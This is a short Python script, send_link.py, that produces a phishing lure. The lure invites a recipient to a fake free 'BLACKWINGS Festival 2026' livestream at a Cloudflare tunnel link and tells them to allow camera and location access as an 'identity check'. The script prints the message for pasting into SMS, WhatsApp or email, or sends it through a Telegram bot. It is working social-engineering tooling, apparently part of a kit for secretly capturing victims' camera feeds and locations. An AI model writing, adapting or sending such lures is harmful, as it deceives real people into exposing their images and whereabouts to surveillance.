#!/usr/bin/env python3
"""
send_link.py — print a ready-to-send lure message, or send via Telegram bot.

Usage:
    python3 send_link.py https://your-tunnel-url.trycloudflare.com
    python3 send_link.py https://your-tunnel-url.trycloudflare.com BOT_TOKEN CHAT_ID
"""

import sys
import urllib.parse
import urllib.request

TEMPLATE = """Hey! BLACKWINGS Festival 2026 is streaming LIVE right now.
Watch the opening show + backstage access for free:

{link}

You'll need to allow camera + location access to enter the live room (identity check).
See you inside!"""


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 send_link.py <https-link> [bot_token chat_id]")
        sys.exit(1)

    link = sys.argv[1]
    msg = TEMPLATE.format(link=link)

    if len(sys.argv) >= 4:
        token, chat_id = sys.argv[2], sys.argv[3]
        data = urllib.parse.urlencode({"chat_id": chat_id, "text": msg}).encode()
        url = "https://api.telegram.org/bot{}/sendMessage".format(token)
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=20) as resp:
            print("[+] Sent via Telegram (HTTP {})".format(resp.status))
    else:
        print("=" * 60)
        print("Copy-paste this message (SMS / WhatsApp / Telegram / email):")
        print("=" * 60)
        print(msg)
        print("=" * 60)


if __name__ == "__main__":
    main()